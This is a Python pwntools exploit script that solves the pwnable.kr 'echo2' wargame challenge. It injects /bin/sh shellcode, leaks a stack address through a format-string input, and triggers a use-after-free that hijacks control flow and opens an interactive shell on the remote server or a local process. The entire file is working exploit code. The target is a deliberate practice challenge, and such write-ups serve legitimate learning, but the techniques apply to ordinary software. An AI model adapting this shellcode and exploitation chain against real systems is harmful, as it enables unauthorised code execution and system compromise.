from pwn import *
import struct
import sys


def main():
    context.arch = 'amd64'
    context.os = 'linux'
    context.endianness='little'

    if(sys.argv[1] == "remote"):
        print("Attacking Server!")
        p = remote("pwnable.kr",9011)
    else:
        print("Running Locally")
        p = process("./echo2")
        
    # Inputs setup
    name = b'\x31\xF6\x56\x48\xBB\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x53\x54\x5F\xF7\xEE\xB0\x3B\x0F\x05'

    p.sendline(name)
    print("injected shellcode: ")
    print(enhex(name))
    p.sendline(b"2");
    p.sendline(b"%10$p");

    p.recvuntil(b">")
    p.recvline()
    RBP_string = p.recvline()[:-1]
    print("Found RBP: ",RBP_string);
    # Convert hex string to an integer
    RBP_int = int(RBP_string,16)-0x20

    # Pack it back as a little-endian byte string
    target_addr = p64(RBP_int)
    print("RBP - 0x20 = ", u64(target_addr))

    payload = b"A" *24 + target_addr

    # UAF! 
    p.sendline(b"4")
    p.sendline(b"n")

    p.sendline(b"3")
    p.sendline(payload)

    # Trigger UAF
    p.sendline(b"3")
    p.interactive()

if __name__=="__main__":
    main()
